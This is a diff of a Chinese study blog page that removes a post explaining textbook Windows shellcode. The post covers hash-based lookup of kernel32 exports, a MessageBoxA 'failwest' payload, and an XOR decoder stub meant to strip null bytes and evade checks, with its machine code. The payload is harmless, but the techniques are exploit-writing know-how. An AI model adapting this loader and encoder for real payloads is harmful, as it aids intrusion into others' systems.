-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line"></span><br><span class="line">	lodsd 					; load next hash into al and increment esi </span><br><span class="line">	cmp eax, 0x1e380a6a		; hash of MessageBoxA - trigger </span><br><span class="line">							; LoadLibrary(&quot;user32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0x8] 		; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of user32.dll 	</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>lodsd指令，取得是双字节，即mov eax，[esi]，esi&#x3D;esi+4；</p>
-</blockquote>
-<p>此处lodsd相当于把0x0c917432放到eax上,然后esi+4,执行后栈的状态</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191748156.png" alt="image-20220917191748156"></p>
-<p>显然eax&#x3D;0x0c917432!&#x3D;0x1e380a6a,jne条件转移实现</p>
-<p>因此跳转find_functions</p>
-<blockquote>
-<p>如果这里eax&#x3D;0x1e380a6a即意味着要寻找MessageBoxA函数地址,则jne条件不满足,顺序执行,</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xchg eax, ebp 			; save current hash </span><br><span class="line">call [edi - 0x8] 		; LoadLibraryA </span><br><span class="line">xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">						; with base address of user32.dll 	</span><br></pre></td></tr></table></figure>
-
-<p>这里edi-0x8是LoadLibraryA的地址,显然是已经获取LoadLibraryA的地址了,这是后话了</p>
-</blockquote>
-<h4 id="遍历两个表寻找目标函数"><a href="#遍历两个表寻找目标函数" class="headerlink" title="遍历两个表寻找目标函数"></a>遍历两个表寻找目标函数</h4><h5 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find_functions: </span><br><span class="line">	pushad 						; preserve registers </span><br><span class="line">	mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">	mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">	add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">	mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">	add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">	xor edi, edi 				; edi will count through the functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>所有通用寄存器压栈保存,然后各司其职设置参数</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png" alt="image-20220917195103779"></p>
-<p>在此之前ebp是指向kernel32.dll的基地址的,其他各个数值依据ebp加上偏移量得到</p>
-<h5 id="库函数表指针后移一个单位"><a href="#库函数表指针后移一个单位" class="headerlink" title="库函数表指针后移一个单位"></a>库函数表指针后移一个单位</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>
-
-<p>edi作为下标,ebx是函数名表的基地址,</p>
-<p>[ebx+edi*4]是一个基址变址寻址,相当于访问数组,数组的每个元素都是4字节的</p>
-<p>显然函数名表的每个表项都是4字节的字符串指针,</p>
-<p>mov esi, [ebx + edi * 4]相当于把一个库函数名指针相对Kernel32.dll的偏移量放到esi上了</p>
-<p>然后加上ebp(kernel32.dll映像基址),就得到了库函数名指针的绝对地址</p>
-<p>cdq的作用是eax有符号拓展到edx:eax</p>
-<h5 id="计算一个库函数名的摘要"><a href="#计算一个库函数名的摘要" class="headerlink" title="计算一个库函数名的摘要"></a>计算一个库函数名的摘要</h5><p>这就是GetHash函数的汇编版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	movsx eax, byte ptr[esi]</span><br><span class="line">	cmp al,ah</span><br><span class="line">	jz compare_hash</span><br><span class="line">	ror edx,7</span><br><span class="line">	add edx,eax</span><br><span class="line">	inc esi</span><br><span class="line">	jmp hash_loop</span><br></pre></td></tr></table></figure>
-
-<p>esi是库函数名指针,取出一个字节解引用后带符号拓展到eax上</p>
-<p>如果al和ah相等,说明eax&#x3D;0,即已经扫描到这个字符串的’\0’,应该结束了,跳转compare_hash进行比较</p>
-<p>否则该字符串还没有结束,继续取值直到al&#x3D;ah</p>
-<h5 id="比较摘要值"><a href="#比较摘要值" class="headerlink" title="比较摘要值"></a>比较摘要值</h5><p>到达这一步的时候,是hash_loops计算完库函数名的摘要值了,结果放到了edx上</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compare_hash:	</span><br><span class="line">	cmp edx, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">	jnz next_function_loop </span><br></pre></td></tr></table></figure>
-
-<p>esp+0x1C指向谁呢?保存的我们希望寻找的摘要值</p>
-<p>[esp+0x1C]解引用,将希望寻找的摘要值和edx进行比较,如果为0说明找到了,不用跳转,否则没找到就得重复next_function_loop计算下一个库函数的摘要和希望的摘要进行比较</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png"></p>
-<h5 id="如果匹配"><a href="#如果匹配" class="headerlink" title="如果匹配"></a>如果匹配</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi] 	; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">							; relative offset of matched function </span><br><span class="line">xchg eax, ebp 				; move func addr into eax </span><br><span class="line">pop edi 					; edi is last onto stack in pushad </span><br><span class="line">stosd 						; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad					; restore registers </span><br><span class="line">		 				; loop until we reach end of last hash </span><br><span class="line">cmp eax,0x1e380a6a</span><br><span class="line">jne find_lib_functions </span><br></pre></td></tr></table></figure>
-
-<p>用名字表的下标查序号表,再用序号表相应值作为下标查导出函数地址表,然后把地址放到eax,写到edi指向的地址上</p>
-<p>当eax&#x3D;0x1e280a6a,即MessageBoxA的摘要时,说明所有函数的地址都查完了并且写好了</p>
-<p>否则还有函数没有解析地址,至少MessageBoxA没有,跳转find_lib_functions外圈大循环,寻找下一个希望的摘要值对应函数的地址</p>
-<h4 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h4><p>执行到这里,所有函数都已经解析完毕,下面就要调用窗口并且exit(0)返回了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function_call:</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	push ebx			// cut string</span><br><span class="line">	push 0x74736577</span><br><span class="line">	push 0x6C696166		//push failwest</span><br><span class="line">	mov eax,esp			//load address of failwest</span><br><span class="line">	push ebx	</span><br><span class="line">	push eax</span><br><span class="line">	push eax</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x04] ; //call MessageboxA</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x08] ; // call ExitProcess</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="shellcode加壳"><a href="#shellcode加壳" class="headerlink" title="shellcode加壳"></a>shellcode加壳</h2><p>shellcode加壳,其目的要么是消去其中的00字节,使得整个shellcode可以被串拷贝进入缓冲区,防止截断</p>
-<p>并且还可能绕过安全检查?</p>
-<p>书上给出的加壳函数decode,使用key&#x3D;0x44对input字符串进行异或加密,input的逐个字节都和key进行异或,结果写入encode.txt</p>
-<p>解码器是这样写的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">			add eax, 0x14 //locate the real start of shellcode</span><br><span class="line">			xor ecx,ecx</span><br><span class="line">decode_loop:</span><br><span class="line">			mov bl,[eax+ecx]</span><br><span class="line">			xor bl, 0x44 //key,should be changed to decode </span><br><span class="line">			mov [eax+ecx],bl</span><br><span class="line">			</span><br><span class="line">			inc ecx</span><br><span class="line">			cmp bl,0x90 // assume 0x90 as the end mark of shellcode </span><br><span class="line">			jne decode_loop</span><br></pre></td></tr></table></figure>
-
-<p>一开始eax增加20个字节,正好跳过解码器</p>
-<blockquote>
-<p>解码器编译之后生成的机器码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">83 C0 14 33 C9 8A 1C 08 80 F3 44 88 1C 08 41 80</span><br><span class="line">FB 90 75 F1</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>ecx一开始置零,后来[eax+ecx]是一个基址编址寻址,eax是基址,即shellcode的基地址,ecx是偏移量,ecx会遍历shellcode区域.当解码出0x90时,意味着shellcode到头了(我们自己规定的shellcode最后以0x90结尾),此时不再重复decode_loop,控制自然顺序转移给shellcode的起始位置</p>
-<p>否则,即尚未解码出0x90,则shellcode还没有完全解密,重复decode_loop</p>
-<p>将解码器的机器码放到shellcode之前,然后将整体放到字符数组里丢到调试环境里就可以弹窗了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/impossible/page/4/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/impossible/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/10/">10</a><a class="extend next" rel="next" href="/impossible/page/6/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/impossible/page/4/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/impossible/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/11/">11</a><a class="extend next" rel="next" href="/impossible/page/6/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
